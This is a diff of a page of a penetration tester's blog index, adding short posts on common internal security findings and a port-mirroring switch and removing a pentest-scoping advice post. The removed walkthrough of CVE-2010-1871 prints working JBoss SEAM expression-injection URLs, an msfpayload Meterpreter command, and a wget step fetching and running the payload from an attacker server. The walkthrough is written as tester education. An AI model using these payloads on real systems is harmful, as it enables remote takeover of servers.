@@ -159,6 +159,71 @@
   <span class="post-date">
     
     March
+    24th,
+    
+    2013
+  </span>
+
+  <h2>
+    <a href="https://raesene.github.io/blog/2013/03/24/three-lines/">Three Lines</a>
+  </h2>
+
+  <div>
+    
+    
+    <p>We've decided that the results/recommendations coming out of most of the Internal Security Reviews we do can be summarised in three lines.</p>
+<p>a)  Patch everything.  Not just Windows - everything.</p>
+<p>b)  Change default credentials.  Don't leave your main router with creds of admin/admin</p>
+<p>c) Get rid of clear text protocols.  Ditch telnet for SSH and ftp for sftp</p>
+<p>It doesn't require Ninjas, Red Teams or Zero days to compromise most organisations, given access to their internal networks.  In fact why bother with anything fancy, when the most basic of techniques uncovers such glaring faults.</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+
+    
+    
+  </div>
+
+</article>
+
+
+<article class="home">
+
+  <span class="post-date">
+    
+    March
+    21st,
+    
+    2013
+  </span>
+
+  <h2>
+    <a href="https://raesene.github.io/blog/2013/03/21/tools-of-the-trade-usb-powered-switches/">Tools of the trade - USB powered Switches</a>
+  </h2>
+
+  <div>
+    
+    
+    <p>As a bit of a tech geek I have a tendency to pick up a variety of pieces of hardware and software to see if they'll be useful on tests.  One of my more successful purchases has been a USB powered Ethernet switch that handles PoE pass-through and has a couple of mirrored ports. It's pretty compact so it goes easily in a bag for on-site jobs and can be useful in a number of scenarios</p>
+<ul>
+<li><span style="line-height:13px;">Lack of Ethernet ports on-site.  I've had this on more than one occasion, you get to site and there's no free ports, so a switch and a couple of patch cables can be very handy<br />
+</span></li>
+<li>Monitoring Thick Client Apps.  Not all apps are particularly proxy friendly, so having an easy way to see all the traffic on the switch is very handy</li>
+<li>VOIP assessments.  A standard part of VOIP assessments is looking at the traffic between the phone and the management servers, so having something that supports PoE pass through is handy as that's how most VOIP phones operate.</li>
+</ul>
+<p>All-in-all if you're a tester, I'd recommend getting something like this.  The one I've got is the Dualcomm <a title="DCGS-2005L" href="http://www.dual-comm.com/gigabit_port-mirroring-LAN_switch.htm">DCGS-2005L</a> although I'm sure there's others that meet the bill.</p>
+
+    
+    
+  </div>
+
+</article>
+
+
+<article class="home">
+
+  <span class="post-date">
+    
+    March
     19th,
     
     2013
@@ -447,87 +512,6 @@
 
 </article>
 
-
-<article class="home">
-
-  <span class="post-date">
-    
-    January
-    13th,
-    
-    2012
-  </span>
-
-  <h2>
-    <a href="https://raesene.github.io/blog/2012/01/13/getting-the-best-from-your-web-application-pentest/">Getting the best from your Web Application Pentest</a>
-  </h2>
-
-  <div>
-    
-    
-    <p><strong>Getting the best from your Web Application Pentest</strong></p>
-<p>We’ve noticed during the many penetration tests we have carried out, that a lot of companies do not always get the best value for money from the tester’s time they have paid for.  Below are some general observations from a tester’s point of view, and some hints for IT Managers and developers on what they should be asking for.</p>
-<p>a)      Black box is not always the best approach.  The vast majority of tests we carry out completely blind – in other words we are not given any information about the systems we are testing (for example the platform the application runs on, the development framework used to create it etc.).  This means that we have to spend a considerable proportion of our time finding out basic details which could easily be supplied in advance.  The point is that we <strong>can</strong> find these things out, and we are time limited, whilst an attacker who is determined to get into your application may have all the time in the world.  By having a preliminary meeting with the tester and supplying some basic details about the application, you save him a lot of time which you have paid for and enable him to focus on the deeper issues rather than the superficial stuff.</p>
-<p>b)      Fix what you can in advance.  We get the same sets of basic findings over and over again.  SSLv2 enabled.  HttpOnly flags not set on session cookies.  Poor password management policy etc. etc. etc.  These all take time to discover and time to report on – and that time is not being spent on finding out the serious issues which may get your application compromised. This policy may not get you a big fat report to wave at management, but it will get you a more thorough test.</p>
-<p>c)       Think about what systems should be in scope.  We often get told that our scope is one application, but on starting to test we find that it is closely linked in with another application that is out of scope.  On one notable occasion the in scope ASP.NET application was reasonably secure but part of its functionality was served by an ancient looking PHP system likely had a large number of issues.  This makes no sense – so when you are scoping a test, don’t just think about the application itself, think about related applications and also the infrastructure that they rely on (DNS, AD, SMTP etc).</p>
-<p>d)      Don’t test web applications in live unless you absolutely have to.  Testing in live does not always give you the best value for money, because in a lot of cases, testers have to be more careful with how they scan to avoid any adverse impact on the system.  Also, if your application has a lot of input fields, there is no way they can all be tested manually in a short time-span, so the only way to get full coverage is to run scanners, and scanners create data and (on occasion) crash servers. At least here in UK, a decent percentage of customers do not want live systems to be actually compromised, so if you want a full on Pentest rather than a risk assessment, give the tester access to a pre-prod system.</p>
-<p>e)      Don’t tie your tester’s hands behind his back.  Bad guys will not throttle back their scanners because you have a flaky firewall.  They will not worry about locking your users’ accounts.  They will not refrain from creating data on your site.  They will not restrain their activities to business hours.  If you do any (or all) of these things you are not getting a full test.  So try to fix any issues you know you have in advance, and then let the tester have full access.</p>
-<p>f)       Testing sites still in active development is largely pointless.  Many are the tests we have done where we are told not to test parts of it because the developers are still working on it.  For reasons that should be obvious, this is a bit of a waste of time.  Making a change to one function and accidentally bypassing input validation can introduce multiple errors in different (and sometimes unexpected) parts of the application.  Ideally the order of events should be something along the lines of Development -&gt; UAT -&gt; Redevelopment -&gt; Security Test in test environment -&gt; Redevelopment -&gt; Move to live -&gt; further Security Test.  But if time or money does not permit – at the very least wait until you have finished coding before you start testing.</p>
-<p>g)      Don’t retest unless you think you have fixed the problems.  We frequently do retests where virtually none of the original issues have been fixed.  This is the ultimate exercise in futility and is a huge waste of your company’s money.  Fix the issues yourself and if you don’t know how, Google is your friend.  If you really can’t find out how to fix something – spend your money on some consultancy rather than on a pointless retest.</p>
-<p>h)      If you know there is a problem you can’t fix – tell the tester.  Don’t let the tester waste huge amounts of time testing and writing up something which you know about already (for example if there is some limitation of the framework or database you are using).  Having a known security vulnerability is bad, but spending money on having someone write about it is even worse.</p>
-<p>i)        Consider using part of the time you have paid for as a corrective exercise.  Following on from point g), dependent on what the issues are you might want to spend part of your time with the tester on taking advice on how to fix the problems.  Testers aren’t generally skilled developers in any particular technology, but we can normally help with configuration issues and at least point in the right direction for more development specific vulnerabilities.</p>
-<p>j)        Verbose reports are not always required.  Normally on a five day test, one day is reserved for report writing (proportionally less or more for shorter or longer tests).  The reason this takes so long is that many testing companies have an elaborate report format with graphics, slides, executive summary etc.  In many cases the findings could be summarized in an email which would take half an hour to write, instead of a fifty page report which takes a whole day.  So if you don’t require a formal report, you can get more value for money out of your test by getting the tester to write it as an email summary.  You will also have a happy tester!!</p>
-<p>&nbsp;</p>
-<p>&nbsp;</p>
-<p>&nbsp;</p>
-
-    
-    
-  </div>
-
-</article>
-
-
-<article class="home">
-
-  <span class="post-date">
-    
-    July
-    30th,
-    
-    2011
-  </span>
-
-  <h2>
-    <a href="https://raesene.github.io/blog/2011/07/30/from-poc-to-shell-cve-2010-1871/">From PoC to Shell - CVE-2010-1871</a>
-  </h2>
-
-  <div>
-    
-    
-    <p>I had a chance to look at CVE-2010-1871 recently which is a vulnerability in JBoss expression language.  As it was an interesting looking vulnerability, I thought it'd be worth walking it through to the point of getting a shell on a vulnerable box, and as it took a bit of fiddling and googling on my part to get there, I figured it could be worth writing up.</p>
-<p>There's a good write-up from the guy who discovered the vulnerability <a title="o0o security research" href="http://blog.o0o.nu/2010/07/cve-2010-1871-jboss-seam-framework.html" target="_blank">here</a> but the basics of the vulnerability is that version of the JBoss SEAM framework have an expression language which can be used to directly execute java code.  (Un)fortuntely it was possible for certain URL parameters passed by users of the application to be executed, which introduces a vulnerability.</p>
-<p>In the blog post Meder goes through the process of finding the appropriate java classess and executing code using reflection, so far so good.  When I came to walk through the PoC exploit (creating a directory on the vulnerable server) the last command<br />
-<code>/seam-booking/home.seam?actionOutcome=/pwn.xhtml?pwned%3d%23{expressions.getClass().forName('java.lang.Runtime').getDeclaredMethods()[19].invoke(expressions.getClass().forName('java.lang.Runtime').getDeclaredMethods()[7].invoke(null), 'mkdir /tmp/PWNED')}</code></p>
-<p>wasn't working for me... so Google time :) (NB, the reference to seam-booking/home.seam is for the sample app used for the PoC, but this should work on any SEAM framework app)</p>
-<p>Looking round to see if anyone else had any joy with this vuln. I came across a post on <a title="Stack Overflow Post" href="http://stackoverflow.com/questions/6635974/jboss-seam-interpolator-could-it-be-use-for-execute-command-java-lang-runtime-e" target="_blank">Stackoverflow</a> , where it looked like someone was getting targeted with this issue in the wild (one to take note of if you run  JBoss!).  From that it looks like the attackers had come to a slightly different means of exploiting the issue, and testing it seemed to work well.  So the basic PoC is setting the actionOutcome parameter to</p>
-<p><code>actionOutcome=/pwn.xhtml?pwned%3d%23{expressions.getClass().forName('java.lang.Runtime').getDeclaredMethods()[6].invoke(expressions.getClass().forName('java.lang.Runtime')).exec('mkdir%20/tmp/pwned')}</code></p>
-<p>This has worked ok for me on Linux and windows (as target platforms).</p>
-<p>Great, so now we have a basic PoC how do we move onto getting a full shell on our vulnerable system?  There's doubtless a number of ways of doing this, but here's one I hit on which seems to work pretty reliably.</p>
-<p>Given that the target server is running a JBoss service, it's a reasonable assumption that it will have java installed, so we can breakout the Java Meterpreter.  First up create the payload using msfpayload.  I used bind_tcp in the lab and it's worth noting that the default metasploit port (4444) is in use, so using a different on (eg, 5556) was a good plan.</p>
-<p><code>./msfpayload java/meterpreter/bind_tcp LPORT=5556 X &gt; lin.jar</code></p>
-<p>Gives us our file payload, now we just need to get it deployed to the target system.  On linux, it's a fair bet that wget will be installed, so I used that to download the file from a webserver</p>
-<p><code>/seam-booking/home.seam?actionOutcome=/pwn.xhtml?pwned%3d%23{expressions.getClass().forName('java.lang.Runtime').getDeclaredMethods()[6].invoke(expressions.getClass().forName('java.lang.Runtime')).exec('wget%20-O%20/tmp/lin.jar%20http://&lt;server&gt;/lin.jar')}</code></p>
-<p>This places the file into /tmp, so now we just need to run it, which is pretty straightforward</p>
-<p><code>/seam-booking/home.seam?actionOutcome=/pwn.xhtml?pwned%3d%23{expressions.getClass().forName('java.lang.Runtime').getDeclaredMethods()[6].invoke(expressions.getClass().forName('java.lang.Runtime')).exec('java%20-jar%20/tmp/lin.jar')}</code></p>
-<p>Having done that, it's just a question of spinning up the metasploit exploit handler and connecting to your waiting meterpreter shell.</p>
-
-    
-    
-  </div>
-
-</article>
-
 <hr/>
 
 <ul class="pager"> 
@@ -541,7 +525,7 @@
   
   
   <li>
-    <span class="page_number">Page: 11 of 54</span>
+    <span class="page_number">Page: 11 of 55</span>
   </li>
 
   
